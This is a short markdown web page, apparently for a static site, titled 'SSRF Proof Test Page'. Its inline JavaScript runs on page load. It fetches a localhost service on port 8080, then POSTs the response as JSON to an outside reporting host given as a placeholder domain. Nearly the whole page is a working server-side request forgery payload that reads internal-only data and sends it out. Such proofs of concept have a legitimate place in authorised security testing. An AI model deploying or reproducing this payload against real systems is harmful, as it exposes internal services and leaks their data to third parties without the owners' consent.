---
title: "SSRF Proof Test Page"
date: 2024-10-23
draft: false
---

# SSRF Proof Test Page

If the SSRF is successful, you will see a response below:

<div id="response">Loading...</div>

<!-- Inline HTML & JavaScript for SSRF Test -->
<script>
    // Function to prove SSRF interaction
    function testSSRF() {
        // Attempt to fetch data from an internal resource
        fetch('http://127.0.0.1:8080/confirm?ssrf=true')
            .then(response => response.text())
            .then(data => {
                // Display the fetched data to prove SSRF
                document.getElementById('response').innerText = 'SSRF Successful! Data: ' + data;

                // Optionally, report the success to your server
                fetch('https://your-trusted-site.com/report_ssrf', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ ssrf_status: 'success', data: data })
                });
            })
            .catch(error => {
                document.getElementById('response').innerText = 'SSRF Test Failed: ' + error.message;
            });
    }

    // Run the SSRF test on page load
    window.onload = testSSRF;
</script>
